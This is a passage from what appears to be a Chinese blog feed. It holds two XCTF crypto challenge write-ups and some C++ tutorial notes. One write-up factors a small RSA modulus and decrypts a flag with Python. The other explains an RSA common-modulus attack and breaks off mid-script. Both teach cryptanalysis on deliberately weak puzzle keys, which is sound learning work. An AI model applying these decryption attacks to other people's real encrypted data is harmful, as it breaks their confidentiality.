<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109153241365.png" alt="image-20201109153241365"></p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
  </entry>
  <entry>
    <title>RSA256</title>
    <url>/2020/10/10/RSA256/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://adworld.xctf.org.cn/task/answer?type=crypto&number=5&grade=1&id=5485&page=2">题目地址</a></p>
<p>题目名称：RSA256</p>
<p>题目描述：</p>
<p>被潘汉年按时来到上海百老汇大厦（今上海大厦），叩开了袁殊临时下榻处的房门。袁殊说明自己当前身份和处境后，突然话锋一转，问潘汉年：“你到我这里来，恐怕已经被日本特务注意到了。我应该怎么向他们解释呢？”潘汉年说：“你就将计就计在敌伪内部站住脚，取得合法地位。同时搜集敌伪情报向我提供。”“要是岩井要求我将你介绍给他怎么办？”“那我就用胡越明的化名同岩井见面，就说我愿意和你在香港合作搞情报。”时隔不久，潘汉年接到袁殊通知，通知内容为：RSA256.tar.gz，要他在上海虹口区一家日本人开的餐馆里，和岩井会见。 请以暗号形式告知我方人员前往保护潘汉年的安全。(答案为flag{XXX}形式)</p>
<p>题目附件：<a href="https://adworld.xctf.org.cn/media/task/attachments/8eec4a4af1e14eb08648c8fda7660a0f.gz">附件1</a></p>
<a id="more"></a>

<p>WriteUp：</p>
<p><strong>解题思路：</strong></p>
<p>下载附件，解压得到RSA256文件夹，里面有两个文件fllllllag.txt和gy.key</p>
<p><img src="/2020/10/10/RSA256/image-20201009220928493.png" alt="image-20201009220928493"></p>
<p>给出了公钥文件gy.key和密文文件fllllllag.txt，就是常规的RSA解密，有多种方法</p>
<p><strong>方法一：利用RsaCtfTool工具（kali虚拟机中）</strong></p>
<p>已知公钥（自动求私钥）–publickey,密文–uncipherfile</p>
<p>命令：<code>python3 RsaCtfTool.py --publickey 公钥文件 --uncipherfile 加密的文件</code></p>
<p><img src="/2020/10/10/RSA256/image-20201010112318322-1602320676468.png" alt="image-20201010112318322"></p>
<p>直接解出明文</p>
<p><strong>方法二：利用公钥文件用openssl工具解出e、n，然后python3脚本解出明文</strong></p>
<p><strong>1、</strong>解出e、n</p>
<p>方式1：</p>
<p>打开kali虚拟机，用openssl解出e、n</p>
<p>命令：<code>openssl rsa -pubin -text -modulus -in warmup -in gy.key</code></p>
<p><img src="/2020/10/10/RSA256/image-20201009221308957.png" alt="image-20201009221308957"></p>
<p>方式2：</p>
<p>用脚本从公钥文件中解出n、e</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment">#1.从公钥文件中分解n和e</span></span><br><span class="line">public_key = RSA.importKey(open(<span class="string">r&quot;G:\ctf\CTF题目\8eec4a4af1e14eb08648c8fda7660a0f\8eec4a4af1e14eb08648c8fda7660a0f\RSA256\gy.key&quot;</span>,<span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">n = public_key.n</span><br><span class="line">e = public_key.e</span><br><span class="line">print(<span class="string">&#x27;N:&#x27;</span>,n)</span><br><span class="line">print(<span class="string">&#x27;E:&#x27;</span>,e)</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="/2020/10/10/RSA256/image-20201010115012461.png" alt="image-20201010115012461"></p>
<p><strong>2、</strong>e为65537，n还比较短，用python先转换成10进制</p>
<p><img src="/2020/10/10/RSA256/image-20201009221558824.png" alt="image-20201009221558824"></p>
<p>对n进行因数分解</p>
<p>方式1：登录网站<a href="http://factordb.com/">http://factordb.com/</a>,解出p和q</p>
<p><img src="/2020/10/10/RSA256/image-20201009221721597.png" alt="image-20201009221721597"></p>
<p>方式2：使用yafu工具</p>
<p>(常用于比较大的整数分解)自动整数因式分解，在RSA中，当p、q的取值差异过大或过于相近的时候，使用yafu可以快速的把n值分解出p、q值！</p>
<p>用法：</p>
<p><img src="/2020/10/10/RSA256/image-20201010113734508.png" alt="image-20201010113734508"></p>
<p>到此，已经获取到RSA的全部参数</p>
<p>p = 273821108020968288372911424519201044333  </p>
<p>q = 280385007186315115828483000867559983517 </p>
<p>n=76775333340223961139427050707840417811156978085146970312315886671546666259161</p>
<p>e=65537</p>
<p><strong>3、</strong>使用python3代码解出明文</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g,y,x=egcd(b%a,a)</span><br><span class="line">        <span class="keyword">return</span> (g,x-(b//a)*y,y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a,m</span>):</span></span><br><span class="line">    g,x,y=egcd(a,m)</span><br><span class="line">    <span class="keyword">if</span> g!=<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x%m</span><br><span class="line">p = <span class="number">273821108020968288372911424519201044333</span>  </span><br><span class="line">q = <span class="number">280385007186315115828483000867559983517</span> </span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d=modinv(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))<span class="comment">#RSA私钥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">r&quot;fllllllag.txt&quot;</span> , <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	s=f.read().hex()<span class="comment">#bytes转16进制字符串</span></span><br><span class="line">c=int(s,<span class="number">16</span>);<span class="comment">#密文，16进制转成int型</span></span><br><span class="line"><span class="comment">#解出明文</span></span><br><span class="line">m=pow(c,d,n)<span class="comment">#得到的是10进制数据</span></span><br><span class="line">hex=hex(m)<span class="comment">#得到16进制数据，最后转字符串就行了</span></span><br><span class="line">print(hex)<span class="comment">#输出16进制数据</span></span><br><span class="line"><span class="comment">#因为base16编码后的字母组成是[0-9A-F],所以要转成大写，否则会提示“Non-base16 digit found”</span></span><br><span class="line"><span class="comment">#还可以写成flag=base64.b16decode(hex[2:],True)或者修改python库base64源码里的b16decode()函数第二个参数为True</span></span><br><span class="line">flag=base64.b16decode(hex[<span class="number">2</span>:].upper())</span><br><span class="line">print(flag)<span class="comment">#输出解码后的字符串</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="/2020/10/10/RSA256/image-20201013095638702.png" alt="image-20201013095638702"></p>
<p>可以看出flag字符串16进制标识，直接base16解码得到flag：</p>
<p>flag{_2o!9_CTF_ECUN_}</p>
<p>提交时需要去掉_(真坑)</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>CRYPTO</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>常规破解模数n</tag>
      </tags>
  </entry>
  <entry>
    <title>C|C++ 菜鸟教程 学习笔记</title>
    <url>/2020/10/19/RUNOOB-C-NOTES/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h6 id="1、环境配置"><a href="#1、环境配置" class="headerlink" title="1、环境配置"></a><strong>1、环境配置</strong></h6><p>文本编辑器（如notepad）和C++编译器（用于把源程序编译成最终的可执行程序）</p>
<p><img src="/2020/10/19/RUNOOB-C-NOTES/qq%E5%9B%BE%E7%89%8720201013214047.png" alt="img"></p>
<a id="more"></a>

<h6 id="2、基本语法"><a href="#2、基本语法" class="headerlink" title="2、基本语法"></a><strong>2、基本语法</strong></h6><ul>
<li>C++ 标识符由字母、$ 、_ 、数字组成，但不能以数字开头。</li>
<li>在 C++ 中，分号是语句结束符。也就是说，每个语句必须以分号结束。</li>
</ul>
<h6 id="3、注释"><a href="#3、注释" class="headerlink" title="3、注释"></a><strong>3、注释</strong></h6><ul>
<li>​    //第一种注释,单行注释</li>
<li>​    /*第二种注释，多行注释*/</li>
<li>​    第三种注释，程序调试方便，修改0-》1即可运行</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;第三种注释&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// 0</span></span></span><br></pre></td></tr></table></figure>

<h6 id="4、数据类型"><a href="#4、数据类型" class="headerlink" title="4、数据类型"></a><strong>4、数据类型</strong></h6><p>变量保留的是它所存储的值的内存位置。</p>
<p>7种基本数据类型</p>
<ul>
<li>布尔型bool</li>
<li>字符串型char</li>
<li>整型int</li>
<li>浮点型float</li>
<li>双浮点型double</li>
<li>无类型void</li>
<li>宽字符型wchar_t</li>
</ul>
<p>一些基本类型可以使用一个或多个类型修饰符进行修饰</p>
<p>派生数据类型</p>
<p>枚举enum</p>
<h6 id="5、变量类型"><a href="#5、变量类型" class="headerlink" title="5、变量类型"></a><strong>5、变量类型</strong></h6><p>变量定义就是告诉编译器在何处创建变量的存储，以及如何创建变量的存储。</p>
<p>变量声明向编译器保证变量以给定的类型和名称存在，这样编译器在不需要知道变量完整细节的情况下也能进一步的编译。变量声明只在编译时有它的意义，在程序连接时编译器需要实际的变量声明。</p>
<h6 id="6、变量作用域"><a href="#6、变量作用域" class="headerlink" title="6、变量作用域"></a><strong>6、变量作用域</strong></h6><p>程序中，局部变量和全局变量的名称可以相同。</p>
<p>存储在静态数据区的变量会在程序刚开始运行时就完成初始化，也是唯一的一次初始化。共有两种变量存储在静态存储区：全局变量和static变量。</p>
<p>全局变量，静态局部变量，静态全局变量都在静态存储区分配空间，而局部变量在栈里分配空间。</p>
<p><img src="/2020/10/19/RUNOOB-C-NOTES/clipboard.png" alt="img"></p>
<h6 id="7、常量"><a href="#7、常量" class="headerlink" title="7、常量"></a><strong>7、常量</strong></h6><p>常量是固定值，在程序执行期间不会改变，又叫做字面量</p>
<p>常量通常定义为大写字母形式</p>
<p><img src="/2020/10/19/RUNOOB-C-NOTES/clipboard.png" alt="img"></p>
<h6 id="8、修饰符类型"><a href="#8、修饰符类型" class="headerlink" title="8、修饰符类型"></a><strong>8、修饰符类型</strong></h6><p>C++允许在char、int和double数据类型放置修饰符。修饰符用于改变基本类型的含义。</p>
<h6 id="9、存储类"><a href="#9、存储类" class="headerlink" title="9、存储类"></a><strong>9、存储类</strong></h6><p>存储类定义C++程序中变量/函数的范围和生命周期。这些说明符放置在他们所修饰的类型之前。</p>
<h6 id="10、运算符"><a href="#10、运算符" class="headerlink" title="10、运算符"></a><strong>10、运算符</strong></h6><p>运算符是一种告诉编译器执行特定的数学或逻辑操作的符号。</p>
<p>算术运算符</p>
<p>关系运算符</p>
<p>逻辑运算符</p>
<p>位运算符</p>
<p>赋值运算符</p>
<p>杂项运算符</p>
<h6 id="11、循环"><a href="#11、循环" class="headerlink" title="11、循环"></a><strong>11、循环</strong></h6><p>循环类型</p>
<ul>
<li>while循环</li>
<li>for循环</li>
<li>do…while循环</li>
<li>嵌套循环</li>
</ul>
<p>循环控制语句</p>
<ul>
<li>break语句</li>
<li>continue语句</li>
</ul>
<h6 id="12、判断"><a href="#12、判断" class="headerlink" title="12、判断"></a><strong>12、判断</strong></h6><ul>
<li>判断语句</li>
<li>if语句</li>
<li>if…else语句</li>
<li>嵌套if语句</li>
<li>switch语句</li>
<li>嵌套switch语句</li>
</ul>
<p>?:运算符</p>
<h6 id="13、函数"><a href="#13、函数" class="headerlink" title="13、函数"></a><strong>13、函数</strong></h6><p>逻辑上每个函数执行一个特定的任务</p>
<p>函数定义一般形式</p>
<p>return_type function_name( parameter list ) {   body of the function }</p>
<p>C++11 提供了对匿名函数的支持,称为 Lambda 函数(也叫 Lambda 表达式)。</p>
<h6 id="14、数字"><a href="#14、数字" class="headerlink" title="14、数字"></a><strong>14、数字</strong></h6><p>数学头文件 <cmath>一些内置数学函数</cmath></p>
<p>随机数生成器</p>
<h6 id="15、数组"><a href="#15、数组" class="headerlink" title="15、数组"></a><strong>15、数组</strong></h6><p>存储一个固定大小的相同类型元素的顺序集合，由连续内存位置组成</p>
<p>声明数组</p>
<p>初始化数组</p>
<p>访问数组元素</p>
<h6 id="16、字符串"><a href="#16、字符串" class="headerlink" title="16、字符串"></a><strong>16、字符串</strong></h6><p><strong>C风格字符串</strong></p>
<p><strong>C++引入string类类型</strong></p>
<h6 id="17、指针"><a href="#17、指针" class="headerlink" title="17、指针"></a><strong>17、指针</strong></h6><p><strong>指针是一个变量，其值是另一个变量的地址</strong></p>
<p>定义一个指针变量、把变量地址赋值给指针、访问指针变量中可用地址的值</p>
<h6 id="18、引用"><a href="#18、引用" class="headerlink" title="18、引用"></a><strong>18、引用</strong></h6><p>引用变量是一个别名，一旦把引用初始化为某个变量，就可以使用该引用名称或变量名称来指向变量。</p>
<p>可以把引用当成是变量附属在内存位置中的第二个标签，&amp; 读作<strong>引用</strong></p>
<h6 id="19、日期-amp-时间"><a href="#19、日期-amp-时间" class="headerlink" title="19、日期&amp;时间"></a><strong>19、日期&amp;时间</strong></h6><p>C++ 继承了 C 语言用于日期和时间操作的结构和函数。使用日期和时间需要引用 <ctime> 头文件。</ctime></p>
<p>四种类型：<strong>clock_t、time_t、size_t</strong> 和 <strong>tm</strong></p>
<h6 id="20、基本输入输出"><a href="#20、基本输入输出" class="headerlink" title="20、基本输入输出"></a><strong>20、基本输入输出</strong></h6><p> I/O 发生在流中，流是字节序列，字节流从设备（如键盘、磁盘驱动器、网络连接等）流向内存叫<strong>输入操作</strong>。从内存流向设备（如显示屏、打印机、磁盘驱动器、网络连接等），叫<strong>输出操作</strong>。</p>
<p>头文件<iostream>、<iomanip>、<fstream></fstream></iomanip></iostream></p>
<h6 id="21、数据结构"><a href="#21、数据结构" class="headerlink" title="21、数据结构"></a><strong>21、数据结构</strong></h6><p><strong>结构</strong>是 C++ 中另一种用户自定义的可用的数据类型，它允许您存储不同类型的数据项。</p>
<p>使用 <strong>struct</strong> 语句定义结构。struct 语句定义了一个包含多个成员的新的数据类型</p>
<p>访问结构的成员，我们使用<strong>成员访问运算符（.）</strong></p>
<h4 id="C-面向对象"><a href="#C-面向对象" class="headerlink" title="C++面向对象"></a><strong>C++面向对象</strong></h4><h6 id="22、类-amp-对象"><a href="#22、类-amp-对象" class="headerlink" title="22、类&amp;对象"></a><strong>22、类&amp;对象</strong></h6><p>C++ 支持面向对象程序设计。类是 C++ 的核心特性，通常被称为用户定义的类型。</p>
<p>类定义是以关键字 <strong>class</strong> 开头，后跟类的名称。类的主体是包含在一对花括号中。类定义后必须跟着一个分号或一个声明列表。</p>
<h6 id="23、继承"><a href="#23、继承" class="headerlink" title="23、继承"></a><strong>23、继承</strong></h6><p>面向对象程序设计中最重要的一个概念是继承。继承允许我们依据另一个类来定义一个类，达到了重用代码功能和提高执行效率的效果。</p>
<p>基类&amp;派生类</p>
<p>访问控制和继承</p>
<h6 id="24、重载运算符和重载函数"><a href="#24、重载运算符和重载函数" class="headerlink" title="24、重载运算符和重载函数"></a><strong>24、重载运算符和重载函数</strong></h6><p>C++ 允许在同一作用域中的某个<strong>函数</strong>和<strong>运算符</strong>指定多个定义，分别称为<strong>函数重载</strong>和<strong>运算符重载</strong>。</p>
<p>调用一个<strong>重载函数</strong>或<strong>重载运算符</strong>时，编译器通过把您所使用的参数类型与定义中的参数类型进行比较，决定选用最合适的定义。</p>
<p>函数重载：同名函数的形式参数（指参数的个数、类型或者顺序）必须不同</p>
<p>重载运算符：函数名是由关键字 operator 和其后要重载的运算符符号构成的</p>
<h6 id="25、多态"><a href="#25、多态" class="headerlink" title="25、多态"></a><strong>25、多态</strong></h6><p>C++ 多态意味着调用成员函数时，会根据调用函数的对象的类型来执行不同的函数。</p>
<p><strong>虚函数</strong> 是在基类中使用关键字 <strong>virtual</strong> 声明的函数。在派生类中重新定义基类中定义的虚函数时，会告诉编译器不要静态链接到该函数，动态链接</p>
<h6 id="26、数据抽象"><a href="#26、数据抽象" class="headerlink" title="26、数据抽象"></a><strong>26、数据抽象</strong></h6><p>数据抽象是指，只向外界提供关键信息，并隐藏其后台的实现细节，即只表现必要的信息而不呈现细节。</p>
<p>数据抽象是一种依赖于接口和实现分离的编程（设计）技术</p>
<h6 id="27、数据封装"><a href="#27、数据封装" class="headerlink" title="27、数据封装"></a><strong>27、数据封装</strong></h6><p><strong>数据封装</strong>是一种把数据和操作数据的函数捆绑在一起的机制，<strong>数据抽象</strong>是一种仅向用户暴露接口而把具体的实现细节隐藏起来的机制。</p>
<h6 id="28、接口（抽象类）"><a href="#28、接口（抽象类）" class="headerlink" title="28、接口（抽象类）"></a><strong>28、接口（抽象类）</strong></h6><p>接口描述了类的行为和功能，而不需要完成类的特定实现。</p>
<p>抽象类类中至少有一个函数被声明为纯虚函数</p>
<p>抽象类不能被用于实例化对象，它只能作为<strong>接口</strong>使用</p>
<h4 id="C-高级教程"><a href="#C-高级教程" class="headerlink" title="C++高级教程"></a><strong>C++高级教程</strong></h4><h6 id="29、文件和流"><a href="#29、文件和流" class="headerlink" title="29、文件和流"></a><strong>29、文件和流</strong></h6><p><strong>fstream标准库，数据类型ofstream、ifstream、fstream</strong></p>
<h6 id="30、异常处理"><a href="#30、异常处理" class="headerlink" title="30、异常处理"></a><strong>30、异常处理</strong></h6><p>异常是程序在执行期间产生的问题，C++ 异常处理涉及到三个关键字：<strong>try、catch、throw</strong>。</p>
<p>可以通过继承和重载 <strong>exception</strong> 类来定义新的异常</p>
<h6 id="31、动态内存"><a href="#31、动态内存" class="headerlink" title="31、动态内存"></a><strong>31、动态内存</strong></h6><p>C++ 程序中的内存分为两个部分：</p>
<ul>
<li><strong>栈：</strong>在函数内部声明的所有变量都将占用栈内存。</li>
<li><strong>堆：</strong>这是程序中未使用的内存，在程序运行时可用于动态分配内存。</li>
</ul>
<h6 id="32、命名空间"><a href="#32、命名空间" class="headerlink" title="32、命名空间"></a><strong>32、命名空间</strong></h6><p>本质上，命名空间就是定义了一个范围</p>
<p>命名空间的定义使用关键字 <strong>namespace</strong>，后跟命名空间的名称</p>
<p>为了调用带有命名空间的函数或变量，需要在前面加上命名空间的名称</p>
<p>可以使用 <strong>using namespace</strong> 指令，这样在使用命名空间时就可以不用在前面加上命名空间的名称。这个指令会告诉编译器，后续的代码将使用指定的命名空间中的名称。</p>
<h6 id="33、模板"><a href="#33、模板" class="headerlink" title="33、模板"></a><strong>33、模板</strong></h6><p>模板是泛型编程的基础，泛型编程即以一种独立于任何特定类型的方式编写代码</p>
<h6 id="34、预处理器"><a href="#34、预处理器" class="headerlink" title="34、预处理器"></a><strong>34、预处理器</strong></h6><p>预处理器是一些指令，指示编译器在实际编译之前所需完成的预处理。</p>
<p>所有的预处理器指令都是以井号（#）开头，只有空格字符可以出现在预处理指令之前</p>
<p>参数宏</p>
<p>条件编译</p>
<h6 id="35、信号处理"><a href="#35、信号处理" class="headerlink" title="35、信号处理"></a><strong>35、信号处理</strong></h6><p>信号是由操作系统传给进程的中断，会提早终止一个程序</p>
<p><strong>Sleep 函数</strong></p>
<p>功能：执行挂起一段时间，也就是等待一段时间在继续执行</p>
<p>用法：<strong>Sleep(时间)</strong></p>
<p>Linux 用 <strong>#include &lt;unistd.h&gt;</strong> 和 <strong>sleep()**，Windos 用 **#include &lt;windows.h&gt;</strong> 和 **Sleep()**。</p>
<h6 id="36、多线程"><a href="#36、多线程" class="headerlink" title="36、多线程"></a><strong>36、多线程</strong></h6><p>多线程是多任务处理的一种特殊形式，多任务处理允许让电脑同时运行两个或两个以上的程序。一般情况下，两种类型的多任务处理：<strong>基于进程和基于线程</strong>。</p>
<ul>
<li>基于进程的多任务处理是程序的并发执行。</li>
<li>基于线程的多任务处理是同一程序的片段的并发执行。</li>
</ul>
<h6 id="37、Web编程"><a href="#37、Web编程" class="headerlink" title="37、Web编程"></a><strong>37、Web编程</strong></h6><p>公共网关接口（CGI），是一套标准，定义了信息是如何在 Web 服务器和客户端脚本之间进行交换的。</p>
<h4 id="C-资源库"><a href="#C-资源库" class="headerlink" title="C++资源库"></a><strong>C++资源库</strong></h4><h6 id="38、STL教程"><a href="#38、STL教程" class="headerlink" title="38、STL教程"></a><strong>38、STL教程</strong></h6><p>C++ STL（标准模板库）是一套功能强大的 C++ 模板类，提供了通用的模板类和函数，这些模板类和函数可以实现多种流行和常用的算法和数据结构，如向量、链表、队列、栈。</p>
<p>核心组件：容器（Containers）算法（Algorithms）迭代器（iterators）</p>
<h6 id="39、标准库"><a href="#39、标准库" class="headerlink" title="39、标准库"></a><strong>39、标准库</strong></h6><p><strong>标准函数库：</strong> 这个库是由通用的、独立的、不属于任何类的函数组成的。函数库继承自 C 语言。</p>
<ul>
<li>输入/输出 I/O</li>
<li>字符串和字符处理</li>
<li>数学</li>
<li>时间、日期和本地化</li>
<li>动态分配</li>
<li>其他</li>
<li>宽字符函数</li>
</ul>
<p><strong>面向对象类库：</strong> 这个库是类及其相关函数的集合。</p>
<ul>
<li>标准的 C++ I/O 类</li>
<li>String 类</li>
<li>数值类</li>
<li>STL 容器类</li>
<li>STL 算法</li>
<li>STL 函数对象</li>
<li>STL 迭代器</li>
<li>STL 分配器</li>
<li>本地化库</li>
<li>异常处理类</li>
<li>杂项支持库</li>
</ul>
<h6 id="40、有用的资源"><a href="#40、有用的资源" class="headerlink" title="40、有用的资源"></a><strong>40、有用的资源</strong></h6><p>网站</p>
<ul>
<li><a href="https://en.cppreference.com/w/cpp/header">C++ Standard Library headers</a> − C++ 标准库。</li>
<li><a href="http://en.wikibooks.org/wiki/C++_Programming">C++ Programming</a> − 这本书涵盖了 C++ 语言编程、软件交互设计、C++ 语言的现实生活应用。</li>
<li><a href="http://www.sunistudio.com/cppfaq/">C++ FAQ</a> − C++ 常见问题</li>
<li><a href="http://www.thefreecountry.com/sourcecode/cpp.shtml">Free Country</a> − Free Country 提供了免费的 C++ 源代码和 C++ 库，这些源代码和库涵盖了压缩、存档、游戏编程、标准模板库和 GUI 编程等 C++ 编程领域。</li>
<li><a href="http://www.hal9k.com/cug/">C and C++ Users Group</a> − C 和 C++ 的用户团体提供了免费的涵盖各种编程领域 C++ 项目的源代码，包括 AI、动画、编译器、数据库、调试、加密、游戏、图形、GUI、语言工具、系统编程等。</li>
</ul>
<p>书籍</p>
<ul>
<li>《Essential C++ 中文版》</li>
<li>《C++ Primer Plus 第6版中文版》</li>
<li>《C++ Primer中文版（第5版）》</li>
</ul>
<h6 id="41、实例"><a href="#41、实例" class="headerlink" title="41、实例"></a><strong>41、实例</strong></h6><ul>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-cout-helloworld.html">C++ 实例 - 输出 “Hello, World!”</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-cout-cin.html">C++ 实例 - 标准输入输出</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-endl.html">C++ 实例 - 输出换行</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-add-numbers.html">C++ 实例 - 实现两个数相加</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-data-types.html">C++ 实例 - 创建不同类型的变量</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-quotient-remainder.html">C++ 实例 - 求商及余数</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-sizeof-operator.html">C++ 实例 - 查看 int, float, double 和 char 变量大小</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-swapping.html">C++ 实例 - 交换两个数</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-even-odd.html">C++ 实例 - 判断一个数是奇数还是偶数</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-vowel-consonant.html">C++ 实例 - 判断元音/辅音</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-largest-number-among-three.html">C++ 实例 - 判断三个数中的最大数</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-quadratic-roots.html">C++ 实例 - 求一元二次方程的根</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-sum-natural-number.html">C++ 实例 - 计算自然数之和</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-leap-year.html">C++ 实例 - 判断闰年</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-factorial.html">C++ 实例 - 求一个数的阶乘</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-pyramid-pattern.html">C++ 实例 - 创建各类三角形图案</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-hcf-gcd.html">C++ 实例 - 求两数的最大公约数</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-lcm.html">C++ 实例 - 求两数最小公倍数</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-calculator-switch-case.html">C++ 实例 - 实现一个简单的计算器</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-monkey-eating-peach.html">猴子吃桃问题</a></li>
</ul>
]]></content>
      <categories>
        <category>C&amp;C++</category>
      </categories>
      <tags>
        <tag>notes</tag>
      </tags>
  </entry>
  <entry>
    <title>best_rsa</title>
    <url>/2020/10/12/best-rsa/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://adworld.xctf.org.cn/task/answer?type=crypto&number=5&grade=1&id=5450&page=2">题目地址</a></p>
<p>题目名称：best_rsa</p>
<p>题目描述：暂无</p>
<p>题目附件：<a href="https://adworld.xctf.org.cn/media/task/attachments/c2d6e7158d7b4cd6a747774f0bdc5f72.zip">附件1</a></p>
<a id="more"></a>

<p>WriteUp：</p>
<p>解题思路：</p>
<p>下载附件，解压后打开文件夹，包含4个文件</p>
<p><img src="/2020/10/12/best-rsa/image-20201012110935219.png" alt="image-20201012110935219"></p>
<p>给出了2个公钥文件和和2个密文文件，用常规的RSA解密方式分别解密，解密失败（n为2048位难以分解）</p>
<p>猜想应该是同一个明文，使用了2个不同的公钥加密得到了不同的密文，对同一明文的多次加密使用相同的模数和不同的公钥指数可能导致<strong>共模攻击</strong></p>
<p><strong>共模攻击适用情况：</strong>明文m、模数n相同，公钥指数e、密文c不同，gcd(e1,e2)==1也就是e1和e2互质</p>
<p><strong>解题过程:</strong></p>
<p>判断e1和e2是否互质的python3脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="comment">#判断两个数是否互素</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a, b</span>):</span>  <span class="comment"># 判断来两个数是否互素,辗转相除法</span></span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gcd(b, a % b)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    x = <span class="number">117</span>  <span class="comment"># x,y的值根据需要修改即可</span></span><br><span class="line">    y = <span class="number">65537</span></span><br><span class="line">    <span class="keyword">if</span> gcd(x, y) == <span class="number">1</span>:  <span class="comment"># 如果两个数的最大公约数是1，那么两数互素。</span></span><br><span class="line">        print(str(x) + <span class="string">&quot; &quot;</span> + str(y) + <span class="string">&quot;  两个数互素&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(str(x) + <span class="string">&quot; &quot;</span> + str(y) + <span class="string">&quot; 两个数不互素&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>共模攻击python3解密脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment">#若给出公钥文件，从公钥文件中分解出n和e</span></span><br><span class="line">public_key1 = RSA.importKey(open(<span class="string">r&quot;G:\ctf\CTF题目\c2d6e7158d7b4cd6a747774f0bdc5f72\publickey1.pem&quot;</span>,<span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">public_key2 = 